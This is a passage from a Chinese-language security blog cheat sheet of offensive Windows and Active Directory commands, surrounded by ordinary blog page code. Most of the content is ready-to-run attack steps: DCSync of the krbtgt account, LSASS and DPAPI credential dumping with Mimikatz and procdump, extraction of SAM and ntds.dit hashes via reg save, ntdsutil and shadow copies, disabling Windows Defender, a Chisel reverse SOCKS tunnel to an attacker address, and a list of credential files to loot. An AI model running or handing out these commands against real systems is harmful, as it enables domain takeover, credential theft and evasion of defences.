lsadump::sam

# DCSync (requires 'ldap' SPN)
lsadump::dcsync /user:dcorp\krbtgt /domain:dollarcorp.moneycorp.local
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Windows Credential Vault转储</p>
<blockquote>
<p>我在和一起使用时遇到了一些问题<code>Invoke-Mimikatz.ps1</code>。如果遇到问题，请尝试使用本机Mimikatz。</p>
</blockquote>
<pre><code># 转储Windows机密，例如计划任务的存储凭据（先提升权限）
vault::list
vault::cred /patch

# 转储Windows机密DPAPI方法（噪音少，没有特定权限，需要）
## 更多信息: https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
## 首先，获取特定密钥的主密钥的GUID
dpapi::cred /in:C:\Users\appadmin\AppData\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D

## LSASS的EITHER Grab dpapi键
sekurlsa::dpapi

## 或抓取并缓存特定密钥
dpapi::masterkey /rpc /in:C:\Users\appadmin\AppData\Roaming\Microsoft\Protect\S-1-5-21-3965405831-1015596948-2589850225-1118\a89b97d2-b520-462d-a924-d57df68c543b

## Mimikatz将缓存主密钥（使用dpapi::cache检查）
## Then run the initial dpapi::cred command again to get the juice!
</code></pre>
<h3 id="没有Mimikatz的密码hash转储"><a href="#没有Mimikatz的密码hash转储" class="headerlink" title="没有Mimikatz的密码hash转储"></a>没有Mimikatz的密码hash转储</h3><p>我们也可以解析系统机密，而无需在目标系统上直接使用Mimikatz。</p>
<h4 id="Dumping-LSASS"><a href="#Dumping-LSASS" class="headerlink" title="Dumping LSASS"></a>Dumping LSASS</h4><p>运行Mimikatz的首选方法是使用目标中LSASS内存的转储副本在本地进行。<a target="_blank" rel="noopener" href="https://github.com/outflanknl/Dumpert">Dumpert</a>，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>或其他（自定义）工具可用于转储LSASS内存。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 通过进程快照（-r）转储LSASS内存，避免与之直接交互</span>
<span class="token punctuation">.</span>\procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>r <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe lsass<span class="token punctuation">.</span>dmp
<span class="token comment" spellcheck="true"># 或者任务管理器找到lsass.exe进程右键创建转储文件</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在我们的攻击系统上下载内存转储文件后，我们可以运行Mimikatz并切换到“ Minidump”模式以如下方式解析文件。</p>
<pre class="line-numbers language-plaintext"><code class="language-plaintext">sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="Dumping-secrets-from-the-registry"><a href="#Dumping-secrets-from-the-registry" class="headerlink" title="Dumping secrets from the registry"></a>Dumping secrets from the registry</h4><p>我们可以从注册表中转储机密并“离线”解析文件，以获取系统机密列表。🚩</p>
<p>在目标上，我们运行以下命令：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">reg<span class="token punctuation">.</span>exe save hklm\sam c:\users\public\downloads\sam<span class="token punctuation">.</span>save
reg<span class="token punctuation">.</span>exe save hklm\system c:\users\public\downloads\system<span class="token punctuation">.</span>save
reg<span class="token punctuation">.</span>exe save hklm\security c:\users\public\downloads\security<span class="token punctuation">.</span>save
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后，在我们的攻击盒子上，我们可以使用Impacket丢弃秘密：</p>
<pre class="line-numbers language-bash"><code class="language-bash">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL <span class="token operator">></span> secrets.out
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h4><p>ntdsutil win2008开始DC中自带的工具</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#交互式</span>
ntdsutil
snapshot
activate instance ntds
create
<span class="token function">mount</span> <span class="token namespace">[GUID]</span>
<span class="token comment" spellcheck="true"># copy 完之后再执行</span>
unmout  <span class="token namespace">[GUID]</span>
<span class="token function">del</span> <span class="token namespace">[GUID]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 非交互式</span>
ntdsutil snapshot <span class="token string">"activate instance ntds"</span> create quit quit
ntdsutil snapshot <span class="token string">"mount &amp;#123;GUID&amp;#125;"</span> quit quit
<span class="token function">copy</span> MOUNT_POINT\windows\ntds\ntds<span class="token punctuation">.</span>dit c:\temp\ntds<span class="token punctuation">.</span>dit
ntdsutil snapshot <span class="token string">"unmount &amp;#123;GUID&amp;#125;"</span> <span class="token string">"delete &amp;#123;GUID&amp;#125;"</span> quit quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump"><a href="#QuarkPwDump分析-下载地址-https-github-com-quarkslab-quarkspwdump" class="headerlink" title="QuarkPwDump分析 [下载地址][https://github.com/quarkslab/quarkspwdump]"></a>QuarkPwDump分析 [下载地址][<a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump]">https://github.com/quarkslab/quarkspwdump]</a></h4><p>在线提取（直接在目标主机执行，实战中不选择此方式。）</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c:\ntds<span class="token punctuation">.</span>dit
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>离线提取 需要两个文件 ntds.dit 和 system.hive ， 其中system.hive可通过reg save hklm\system system.hive获取</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">QuarkPwDump<span class="token punctuation">.</span>exe <span class="token operator">--</span>dump<span class="token operator">-</span>hash<span class="token operator">-</span>domain <span class="token operator">--</span>with<span class="token operator">-</span>history <span class="token operator">--</span>ntds<span class="token operator">-</span>file c:\ntds<span class="token punctuation">.</span>dit <span class="token operator">--</span>system<span class="token operator">-</span>file c:\system<span class="token punctuation">.</span>hive >c:\hash<span class="token punctuation">.</span>txt
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="ntdsutil-ifm-模块"><a href="#ntdsutil-ifm-模块" class="headerlink" title="ntdsutil: ifm 模块"></a>ntdsutil: ifm 模块</h4><p>WINDOWS SERVER 2008-2016</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">C:\> ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\audit
ifm: quit
ntdsutil: quit
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用NtdsAudit.exe<a target="_blank" rel="noopener" href="https://github.com/Dionach/NtdsAudit/releases/download/v2.0.5/NtdsAudit.exe">下载地址</a>解出ntds的hash</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">NtdsAudit<span class="token punctuation">.</span>exe <span class="token string">"ntds.dit"</span> <span class="token operator">-</span>s <span class="token string">"SYSTEM"</span> <span class="token operator">-</span>p pwdump<span class="token punctuation">.</span>txt <span class="token operator">--</span>users<span class="token operator">-</span>csv users<span class="token punctuation">.</span>csv
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>NtdsAudit需要<code>ntds.dit</code> Active Directory数据库，<code>SYSTEM</code> 如果转储密码哈希，则需要注册表配置单元。这些文件由域控制器锁定，因此无法简单地复制和粘贴。从域控制器获取这些文件的推荐方法是使用内置<code>ntdsutil</code>实用程序。</p>
<ul>
<li>以管理员身份打开命令提示符（<code>cmd.exe</code>）。要以管理员身份打开命令提示符，请单击“启动”。在“开始搜索”中，键入命令提示符。在“开始”菜单的顶部，右键单击“命令提示符”，然后单击“以管理员身份运行”。如果出现“用户帐户控制”对话框，请输入相应的凭据（如果已请求）并确认其显示的操作是您所需的操作，然后单击“继续”。</li>
</ul>
<pre class="line-numbers language-powershell"><code class="language-powershell">  <span class="token comment" spellcheck="true"># 在命令提示符下，键入以下命令，然后按ENTER键：</span>
  ntdsutil
  
  <span class="token comment" spellcheck="true"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span>
  activate instance ntds
  
  <span class="token comment" spellcheck="true"># 在ntdsutil提示符下，键入以下命令，然后按Enter：</span>
  ifm
  
  <span class="token comment" spellcheck="true"># 在ifm提示符下，键入以下命令，然后按Enter：</span>
  create full &lt;Drive>:\&lt;Folder>
  
  <span class="token comment" spellcheck="true"># &lt;Drive>:\&lt;Folder> 是要创建的文件的文件夹路径。</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>  例如，以下命令将显示统计信息，输出<code>pwdump.txt</code>包含密码哈希值的文件，并输出<code>users.csv</code>包含每个用户帐户详细信息的文件。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">ntdsaudit ntds<span class="token punctuation">.</span>dit <span class="token operator">-</span>s SYSTEM <span class="token operator">-</span>p pwdump<span class="token punctuation">.</span>txt <span class="token operator">-</span>u users<span class="token punctuation">.</span>csv
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="Linux-明文密码的获取"><a href="#Linux-明文密码的获取" class="headerlink" title="Linux 明文密码的获取"></a>Linux 明文密码的获取</h4><p>mimipenguin</p>
<p>git clone <a target="_blank" rel="noopener" href="https://github.com/huntergregal/mimipenguin">https://github.com/huntergregal/mimipenguin</a></p>
<p>支持的操作系统</p>
<table>
<thead>
<tr>
<th align="left">os</th>
<th align="left">service</th>
<th align="left">supported</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Ubuntu Desktop 12.04 LTS x64</td>
<td align="left">gnome-keyring-daemon (3.18.3)</td>
<td align="left">Y</td>
</tr>
<tr>
<td align="left">Ubuntu Desktop 16.04 LTS x64</td>
<td align="left">gnome-keyring-daemon (3.18.3)</td>
<td align="left">Y</td>
</tr>
<tr>
<td align="left">Fedora Workstation 25 (x86_64)</td>
<td align="left">gnome-keyring-daemon (3.20.0)</td>
<td align="left">Y</td>
</tr>
<tr>
<td align="left">Fedora Workstation 27 (x86_64)</td>
<td align="left">gnome-keyring-daemon (3.20.1)</td>
<td align="left">Y</td>
</tr>
<tr>
<td align="left">Kali-rolling x64</td>
<td align="left">gnome-keyring-daemon (3.28.0.2)</td>
<td align="left">Y</td>
</tr>
</tbody></table>
<h4 id="从卷影副本中转储快照"><a href="#从卷影副本中转储快照" class="headerlink" title="从卷影副本中转储快照"></a>从卷影副本中转储快照</h4><p>我们还可以创建<code>SAM</code>和<code>SYSTEM</code>文件的“卷影副本” （它们始终锁定在当前系统上），因此我们仍然可以将它们复制到本地系统中。为此需要提升的提示</p>
<pre class="line-numbers language-powershell"><code class="language-powershell">wmic shadowcopy call create Volume=<span class="token string">'C:\'</span>
<span class="token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec<span class="token punctuation">.</span>corp1\Downloads\sam
<span class="token function">copy</span> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec<span class="token punctuation">.</span>corp1\Downloads\system
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="关闭Windows-Defender"><a href="#关闭Windows-Defender" class="headerlink" title="关闭Windows Defender"></a>关闭Windows Defender</h3><p>👀🚩</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>MpPreference <span class="token operator">-</span>DisableRealtimeMonitoring <span class="token boolean">$true</span>

<span class="token function">Set</span><span class="token operator">-</span>MpPreference <span class="token operator">-</span>DisableIOAVProtection <span class="token boolean">$true</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>或将Defender保持启用状态，然后从其中删除签名。</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token string">"C:\Program Files\Windows Defender\MpCmdRun.exe"</span> <span class="token operator">-</span>RemoveDefinitions <span class="token operator">-</span>All
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Chisel-代理"><a href="#Chisel-代理" class="headerlink" title="Chisel 代理"></a>Chisel 代理</h3><p>这是一个有关如何设置Socks代理以在受感染主机上进行凿凿的示例。凿子还可以做更多的事情！</p>
<p>在攻击者机器（Linux或Windows）上：</p>
<pre class="line-numbers language-bash"><code class="language-bash">./chisel server -p 8888 --reverse
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>目标执行：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\chisel_windows_386<span class="token punctuation">.</span>exe client 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>16<span class="token punctuation">.</span>7:8888 R:8001:127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1:9001
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在，我们正在侦听<code>localhost:8001</code>攻击机，以将流量转发给<code>target:9001</code>。</p>
<p>然后，打开Socks服务器。估计的正好：</p>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token punctuation">.</span>\chisel_windows_386<span class="token punctuation">.</span>exe server <span class="token operator">-</span>p 9001 <span class="token operator">--</span>socks5
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>在攻击机上：</p>
<pre class="line-numbers language-bash"><code class="language-bash">./chisel client localhost:8001 socks
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>现在，在攻击计算机的端口1080上打开了一个代理。</p>
<h3 id="Juicy-files"><a href="#Juicy-files" class="headerlink" title="Juicy files"></a>Juicy files</h3><p>有很多文件可能包含有趣的信息。<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a>类的工具或<a target="_blank" rel="noopener" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">PowerSploit</a>类的<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">集合</a>可能有助于识别多汁的文件（用于privesc或post-exploitation）。</p>
<p>以下是我遇到过的一些相关文件的列表。根据计算机上安装的程序和/或服务检查文件。</p>
<blockquote>
<p>此外，不要忘记使用<code>sqlcmd</code>或枚举任何本地数据库<code>Invoke-SqlCmd</code>。</p>
</blockquote>
<pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 所有用户文件夹</span>
<span class="token comment" spellcheck="true">## 如果文件太多，请限制此命令;）</span>
tree <span class="token operator">/</span>f <span class="token operator">/</span>a C:\Users

<span class="token comment" spellcheck="true"># Web.config</span>
C:\inetpub\www\<span class="token operator">*</span>\web<span class="token punctuation">.</span>config

<span class="token comment" spellcheck="true"># Unattend 文件</span>
C:\Windows\Panther\Unattend<span class="token punctuation">.</span>xml

<span class="token comment" spellcheck="true"># RDP 配置文件</span>
C:\ProgramData\Configs\

<span class="token comment" spellcheck="true"># Powershell scripts/config 文件</span>
C:\Program Files\Windows PowerShell\

<span class="token comment" spellcheck="true"># PuTTy 配置文件</span>
C:\Users\<span class="token namespace">[USERNAME]</span>\AppData\LocalLow\Microsoft\Putty

<span class="token comment" spellcheck="true"># FileZilla 证书</span>
C:\Users\<span class="token namespace">[USERNAME]</span>\AppData\Roaming\FileZilla\FileZilla<span class="token punctuation">.</span>xml

<span class="token comment" spellcheck="true"># Jenkins creds (also check out the Windows vault, see above)</span>
C:\Program Files\Jenkins\credentials<span class="token punctuation">.</span>xml

<span class="token comment" spellcheck="true"># WLAN profiles</span>
C:\ProgramData\Microsoft\Wlansvc\Profiles\<span class="token operator">*</span><span class="token punctuation">.</span>xml

<span class="token comment" spellcheck="true"># TightVNC 密码 (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)</span>
<span class="token function">Get-ItemProperty</span> <span class="token operator">-</span>Path HKLM:\Software\TightVNC\Server <span class="token operator">-</span>Name <span class="token string">"Password"</span> <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty Password
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">yaron</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://s-yaron.github.io/2021/06/08/windows-he-active-directory-bei-wang-dan-he-ming-ling-can-kao.htm">http://s-yaron.github.io/2021/06/08/windows-he-active-directory-bei-wang-dan-he-ming-ling-can-kao.htm</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">yaron</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/">
                                    <span class="chip bg-color">备忘录</span>
                                </a>
                            
                                <a href="/tags/AD/">
                                    <span class="chip bg-color">AD</span>
                                </a>
                            
                                <a href="/tags/%E5%9F%9F/">
                                    <span class="chip bg-color">域</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.jpg" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    
    <div class="livere-card card" data-aos="fade-up">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" class="card-content" data-id="city" data-uid="MTAyMC8zMjI3MC84ODM0">
        <script type="text/javascript">
            (function (d, s) {
                let j, e = d.getElementsByTagName(s)[0];
                if (typeof LivereTower === 'function') {
                    return;
                }

                j = d.createElement(s);
                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
                j.async = true;

                e.parentNode.insertBefore(j, e);
            })(document, 'script');
        </script>
        <noscript>为正常使用来必力评论功能请激活JavaScript。</noscript>
    </div>
    <!-- City版安装代码已完成 -->
</div>
    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/06/08/wininet-downloader-cpp.htm">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="wininet_downloader_cpp">
                        
                        <span class="card-title">wininet_downloader_cpp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
wininet.lib  cpp 下载

                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/code/" class="post-category">
                                    code
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/code/">
                        <span class="chip bg-color">code</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/06/08/windows-nei-wang-ming-ling.htm">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Windows 内网命令收集">
                        
                        <span class="card-title">Windows 内网命令收集</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Windows 内网命令常见信息收集命令
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-08
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/intranet/" class="post-category">
                                    内网
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%86%85%E7%BD%91/">
                        <span class="chip bg-color">内网</span>
                    </a>
                    
                    <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
                        <span class="chip bg-color">域渗透</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('120')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: 信息安全初学者<br />'
            + '文章作者: yaron<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
<!-- �������� -->
<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
<!-- ����鸴�� -->
<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
<!-- ��������� -->
<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
<!-- ��������� -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>

    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
